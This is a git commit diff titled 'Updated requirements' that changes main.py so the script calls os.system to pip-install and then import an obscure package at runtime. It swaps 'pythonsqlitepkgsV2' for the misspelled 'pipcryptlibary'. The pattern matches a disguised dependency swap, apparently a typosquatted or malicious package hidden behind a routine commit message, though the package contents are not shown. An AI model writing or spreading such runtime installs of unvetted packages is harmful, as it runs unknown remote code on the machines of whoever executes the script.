1fa9de5287bcb8bcc22571400ff1de7a57fa2e13
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-08 23:14:59 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitepkgsV2")
-import pythonsqlitepkgsV2
+os.system("pip install pipcryptlibary")
+import pipcryptlibary
 import random
 import requests
 import time
